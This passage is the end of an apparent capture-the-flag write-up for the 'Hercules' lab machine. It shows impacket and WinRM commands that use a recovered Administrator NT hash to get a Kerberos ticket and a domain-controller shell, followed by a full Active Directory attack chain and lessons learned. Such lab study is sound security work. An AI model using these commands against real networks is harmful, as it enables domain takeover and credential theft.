I used the recovered NT hash to request a TGT for `Administrator`:

```bash
impacket-getTGT \
'hercules.htb/Administrator' \
-hashes :56855ee6b7570edefde6ac262200756e
```

I then exported the resulting ticket:

```bash
export KRB5CCNAME=$(pwd)/Administrator.ccache
```

---

# Administrator Shell

Finally, I used the Administrator Kerberos ticket to connect to the Domain Controller over WinRM:

```bash
python3 winrmexec.py \
-ssl \
-port 5986 \
-k \
-no-pass \
hercules.htb/Administrator@dc.hercules.htb
```

This provided a shell as:

```text
Administrator
```

---

# Root Flag

The final flag was located at:

```text
C:\Users\Admin\Desktop\root.txt
```

I retrieved it with:

```powershell
cat C:\Users\Admin\Desktop\root.txt
```
# Machine Pwned!

The complete attack chain was:
<div align="center">

```text
LDAP Injection
  ↓
Username Enumeration
  ↓
LDAP Description Enumeration
  ↓
Password
  ↓
ken.w
  ↓
LFI
  ↓
web.config
  ↓
ASP.NET Machine Keys
  ↓
Authentication Cookie Forgery
  ↓
web_admin
  ↓
Malicious ODT Upload
  ↓
NTLMv2 Capture
  ↓
natalie.a
  ↓
Shadow Credentials
  ↓
bob.w
  ↓
Move Auditor → Web Department
  ↓
Shadow Credentials
  ↓
auditor
  ↓
FOREST MANAGEMENT
  ↓
FOREST MIGRATION OU
  ↓
fernando.r
  ↓
ESC3
  ↓
ashley.b
  ↓
Cleanup Script
  ↓
iis_administrator
  ↓
iis_webserver$
  ↓
U2U / S4U2Self
  ↓
RBCD
  ↓
Administrator CIFS Ticket
  ↓
NTDS Dump
  ↓
Administrator NT Hash
```

</div>

---


# Lessons Learned



- Client-side validation should never be trusted, as it can often be bypassed by manipulating requests directly.

- Blind LDAP injection can be used to enumerate sensitive attributes character by character through true/false response differences.

- Authentication response differences can leak valid usernames and provide a useful enumeration oracle.

- ASP.NET `web.config` files can expose machine keys that allow authentication cookies to be decrypted and forged.

- Authentication cookies containing user roles become dangerous when their integrity can be compromised.

- Malicious `.odt` files can be used to trigger NTLM authentication and capture credential material.

- Active Directory write permissions should always be investigated carefully, especially when they can be combined with Shadow Credentials.

- OU permissions, group memberships, and object-level permissions can form complex privilege escalation paths.

- Disabled Active Directory accounts may still possess valuable privileges and should not be overlooked.

- AD CS misconfigurations such as ESC3 can allow certificate-based impersonation of other users.

- Protected accounts with `adminCount` set can require alternative approaches when attempting to modify their permissions.

- RBCD and Kerberos U2U can become powerful attack primitives when combined with control over a machine account.

- Small weaknesses across different components can be chained together to achieve complete domain compromise.



---



**Personal Opinion:** Hercules was a great example of how multiple seemingly minor weaknesses can be chained into a complete compromise. The chain from LDAP injection → credential enumeration → LFI → machine-key exposure → cookie forgery → NTLM capture → Shadow Credentials → AD CS → RBCD → Administrator access highlighted how weaknesses across a web application and Active Directory environment can ultimately lead to full domain compromise.




